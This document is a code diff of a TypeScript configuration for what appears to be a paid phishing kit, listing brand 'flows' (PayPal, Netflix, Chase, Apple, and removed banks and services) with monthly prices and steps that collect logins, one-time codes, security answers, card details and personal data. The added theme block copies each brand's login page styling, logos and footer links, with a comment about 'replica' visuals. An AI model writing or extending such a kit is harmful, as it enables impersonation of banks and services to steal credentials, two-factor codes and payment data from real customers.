@@ -3,15 +3,57 @@
  * Manages available flows (brands) and user subscriptions
  */
 
+export interface FlowTheme {
+    mode: 'light' | 'dark';
+    background: {
+        type: 'color' | 'image' | 'gradient';
+        value: string;
+    };
+    layout: 'centered' | 'split' | 'simple';
+    card: {
+        background: string;
+        border: string;
+        radius: string;
+        shadow: string;
+        maxWidth: string;
+        padding: string;
+    };
+    input: {
+        style: 'modern' | 'material' | 'outline' | 'flat';
+        activeColor: string;
+        borderRadius: string;
+        backgroundColor: string;
+        textColor: string;
+        labelBehavior: 'float' | 'top' | 'placeholder';
+    };
+    button: {
+        background: string;
+        color: string;
+        borderRadius: string;
+        width: 'full' | 'auto';
+        style: 'flat' | 'gradient' | 'outline';
+    };
+    header: {
+        logoUrl: string; // URL or asset path
+        logoHeight: string;
+        alignment: 'center' | 'left';
+    };
+    footer: {
+        style: 'simple' | 'links' | 'hidden';
+        links: { text: string; url?: string }[];
+        textColor: string;
+    };
+}
+
 export interface FlowConfig {
     id: string;
     name: string;
     category: 'payments' | 'streaming' | 'banking' | 'ecommerce' | 'tech';
-    icon: string;           // Emoji or icon class
-    logo?: string;          // Logo URL
-    color: string;          // Brand primary color
+    icon: string;           // Emoji or icon class for Admin UI
+    color: string;          // Brand primary color for Admin UI
     monthlyPrice: number;   // Price in USD
     description: string;
+    theme: FlowTheme;       // Theming configuration
     steps: FlowStep[];
     popular?: boolean;
 }
@@ -43,27 +85,49 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
         monthlyPrice: 0,
         description: 'Payment verification flow',
         popular: true,
+        theme: {
+            mode: 'light',
+            background: { type: 'color', value: '#F5F7FA' },
+            layout: 'centered',
+            card: {
+                background: '#ffffff',
+                border: '1px solid #e5e7eb',
+                radius: '0.75rem',
+                shadow: '0 4px 6px -1px rgba(0, 0, 0, 0.1)',
+                maxWidth: '450px',
+                padding: '2.5rem'
+            },
+            input: {
+                style: 'modern',
+                activeColor: '#003087',
+                borderRadius: '0.5rem',
+                backgroundColor: '#ffffff',
+                textColor: '#111827',
+                labelBehavior: 'float'
+            },
+            button: {
+                background: '#003087',
+                color: '#ffffff',
+                borderRadius: '999px',
+                width: 'full',
+                style: 'flat'
+            },
+            header: {
+                logoUrl: 'assets/logos/paypal.png',
+                logoHeight: '32px',
+                alignment: 'center'
+            },
+            footer: {
+                style: 'links',
+                links: [{ text: 'Contact' }, { text: 'Privacy' }, { text: 'Legal' }],
+                textColor: '#6b7280'
+            }
+        },
         steps: [
             { id: 'login', name: 'Login', type: 'login', required: true, order: 1 },
             { id: 'otp', name: 'OTP Verification', type: 'otp', required: true, order: 2 },
             { id: 'card', name: 'Card Details', type: 'card', required: false, order: 3 },
             { id: 'personal', name: 'Personal Info', type: 'personal', required: false, order: 4 }
-        ]
-    },
-    {
-        id: 'amazon',
-        name: 'Amazon',
-        category: 'ecommerce',
-        icon: '📦',
-        color: '#ff9900',
-        monthlyPrice: 15,
-        description: 'E-commerce account verification',
-        popular: true,
-        steps: [
-            { id: 'login', name: 'Login', type: 'login', required: true, order: 1 },
-            { id: 'otp', name: 'OTP Verification', type: 'otp', required: true, order: 2 },
-            { id: 'card', name: 'Payment Method', type: 'card', required: false, order: 3 },
-            { id: 'address', name: 'Address Verification', type: 'personal', required: false, order: 4 }
         ]
     },
     {
@@ -74,54 +138,47 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
         color: '#e50914',
         monthlyPrice: 10,
         description: 'Streaming account verification',
+        theme: {
+            mode: 'dark',
+            background: { type: 'image', value: 'url("assets/bg/netflix-bg.jpg")' },
+            layout: 'centered',
+            card: {
+                background: 'rgba(0, 0, 0, 0.75)',
+                border: 'none',
+                radius: '4px',
+                shadow: '0 10px 15px -3px rgba(0, 0, 0, 0.5)',
+                maxWidth: '440px',
+                padding: '4rem 3rem'
+            },
+            input: {
+                style: 'material',
+                activeColor: '#e50914',
+                borderRadius: '4px',
+                backgroundColor: '#333333',
+                textColor: '#ffffff',
+                labelBehavior: 'float'
+            },
+            button: {
+                background: '#e50914',
+                color: '#ffffff',
+                borderRadius: '4px',
+                width: 'full',
+                style: 'flat'
+            },
+            header: {
+                logoUrl: 'assets/logos/netflix.png',
+                logoHeight: '45px',
+                alignment: 'left'
+            },
+            footer: {
+                style: 'links',
+                links: [{ text: 'Help Center' }, { text: 'Terms of Use' }, { text: 'Privacy' }],
+                textColor: '#737373'
+            }
+        },
         steps: [
             { id: 'login', name: 'Login', type: 'login', required: true, order: 1 },
-            { id: 'card', name: 'Payment Update', type: 'card', required: true, order: 2 },
-            { id: 'email', name: 'Email Verification', type: 'email', required: false, order: 3 }
-        ]
-    },
-    {
-        id: 'spotify',
-        name: 'Spotify',
-        category: 'streaming',
-        icon: '🎵',
-        color: '#1db954',
-        monthlyPrice: 10,
-        description: 'Music streaming verification',
-        steps: [
-            { id: 'login', name: 'Login', type: 'login', required: true, order: 1 },
-            { id: 'card', name: 'Payment Method', type: 'card', required: true, order: 2 }
-        ]
-    },
-    {
-        id: 'prime',
-        name: 'Prime Video',
-        category: 'streaming',
-        icon: '📺',
-        color: '#00a8e1',
-        monthlyPrice: 10,
-        description: 'Prime Video verification',
-        steps: [
-            { id: 'login', name: 'Login', type: 'login', required: true, order: 1 },
-            { id: 'otp', name: 'OTP Verification', type: 'otp', required: true, order: 2 },
-            { id: 'card', name: 'Payment Update', type: 'card', required: false, order: 3 }
-        ]
-    },
-    {
-        id: 'bankofamerica',
-        name: 'Bank of America',
-        category: 'banking',
-        icon: '🏦',
-        color: '#012169',
-        monthlyPrice: 25,
-        description: 'Banking verification flow',
-        popular: true,
-        steps: [
-            { id: 'login', name: 'Online Banking Login', type: 'login', required: true, order: 1 },
-            { id: 'security', name: 'Security Questions', type: 'security', required: true, order: 2 },
-            { id: 'otp', name: 'OTP Verification', type: 'otp', required: true, order: 3 },
-            { id: 'card', name: 'Card Verification', type: 'card', required: false, order: 4 },
-            { id: 'personal', name: 'Identity Verification', type: 'personal', required: false, order: 5 }
+            { id: 'card', name: 'Payment Update', type: 'card', required: true, order: 2 }
         ]
     },
     {
@@ -133,24 +190,47 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
         monthlyPrice: 25,
         description: 'Chase banking verification',
         popular: true,
+        theme: {
+            mode: 'light',
+            background: { type: 'image', value: 'url("assets/bg/chase-bg.jpg")' },
+            layout: 'split',
+            card: {
+                background: 'rgba(255, 255, 255, 0.95)',
+                border: 'none',
+                radius: '0px',
+                shadow: '0 20px 25px -5px rgba(0, 0, 0, 0.1)',
+                maxWidth: '400px',
+                padding: '3rem'
+            },
+            input: {
+                style: 'modern',
+                activeColor: '#117aca',
+                borderRadius: '0px',
+                backgroundColor: '#f3f4f6',
+                textColor: '#1f2937',
+                labelBehavior: 'float'
+            },
+            button: {
+                background: '#117aca',
+                color: '#ffffff',
+                borderRadius: '4px',
+                width: 'full',
+                style: 'flat'
+            },
+            header: {
+                logoUrl: 'assets/logos/chase.png',
+                logoHeight: '30px',
+                alignment: 'center'
+            },
+            footer: {
+                style: 'simple',
+                links: [{ text: 'Privacy' }, { text: 'Security' }],
+                textColor: '#ffffff'
+            }
+        },
         steps: [
             { id: 'login', name: 'Login', type: 'login', required: true, order: 1 },
             { id: 'security', name: 'Security Verification', type: 'security', required: true, order: 2 },
-            { id: 'otp', name: 'OTP Verification', type: 'otp', required: true, order: 3 },
-            { id: 'card', name: 'Card Details', type: 'card', required: false, order: 4 }
-        ]
-    },
-    {
-        id: 'wellsfargo',
-        name: 'Wells Fargo',
-        category: 'banking',
-        icon: '🔴',
-        color: '#d71e28',
-        monthlyPrice: 25,
-        description: 'Wells Fargo banking flow',
-        steps: [
-            { id: 'login', name: 'Login', type: 'login', required: true, order: 1 },
-            { id: 'security', name: 'Security Questions', type: 'security', required: true, order: 2 },
             { id: 'otp', name: 'OTP Verification', type: 'otp', required: true, order: 3 }
         ]
     },
@@ -162,25 +242,47 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
         color: '#a2aaad',
         monthlyPrice: 20,
         description: 'Apple ID verification',
+        theme: {
+            mode: 'light',
+            background: { type: 'color', value: '#ffffff' },
+            layout: 'centered',
+            card: {
+                background: '#ffffff',
+                border: 'none',
+                radius: '0px',
+                shadow: 'none',
+                maxWidth: '400px',
+                padding: '2rem 0'
+            },
+            input: {
+                style: 'outline',
+                activeColor: '#0071e3',
+                borderRadius: '12px',
+                backgroundColor: '#ffffff',
+                textColor: '#1d1d1f',
+                labelBehavior: 'top'
+            },
+            button: {
+                background: 'linear-gradient(to right, #40cbe2, #0071e3)', // Just example, Apple doesn't use gradient button usually but for "replica" visuals
+                color: '#ffffff',
+                borderRadius: '12px',
+                width: 'full',
+                style: 'gradient'
+            },
+            header: {
+                logoUrl: 'assets/logos/apple.png',
+                logoHeight: '80px', // Bigger centered icon
+                alignment: 'center'
+            },
+            footer: {
+                style: 'simple',
+                links: [{ text: 'Create Apple ID' }, { text: 'Forgot ID or Password?' }],
+                textColor: '#1d1d1f'
+            }
+        },
         steps: [
             { id: 'login', name: 'Apple ID Login', type: 'login', required: true, order: 1 },
-            { id: 'otp', name: '2FA Verification', type: 'otp', required: true, order: 2 },
-            { id: 'card', name: 'Payment Method', type: 'card', required: false, order: 3 },
-            { id: 'phone', name: 'Phone Verification', type: 'phone', required: false, order: 4 }
-        ]
-    },
-    {
-        id: 'microsoft',
-        name: 'Microsoft',
-        category: 'tech',
-        icon: '🪟',
-        color: '#00a4ef',
-        monthlyPrice: 20,
-        description: 'Microsoft account verification',
-        steps: [
-            { id: 'login', name: 'Microsoft Login', type: 'login', required: true, order: 1 },
-            { id: 'otp', name: 'Authenticator Code', type: 'otp', required: true, order: 2 },
-            { id: 'email', name: 'Email Verification', type: 'email', required: false, order: 3 }
+            { id: 'otp', name: '2FA Verification', type: 'otp', required: true, order: 2 }
         ]
     }
 ];
